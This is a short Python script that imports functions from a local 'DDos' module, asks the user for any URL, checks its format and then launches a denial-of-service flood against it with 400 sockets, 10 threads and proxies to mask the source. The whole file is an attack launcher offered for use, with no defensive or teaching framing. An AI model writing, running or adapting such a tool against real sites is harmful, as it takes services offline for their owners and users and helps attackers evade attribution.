import sys
sys.path.insert(0, './DDos')

from DDos import checkUrl, DDos # import the needed functions
while True:
    url = input("Give me a URL: ") # get a url from the user
    if checkUrl(url): break # if it's formatted correctly exit the loop
    else: print("This URL isn't formatted correctly, try again") # else, go back
DDos(url, sockets = 400, threads = 10, use_proxies = True) # ddos this url with 400 sockets and 10 threads and use the built-it proxies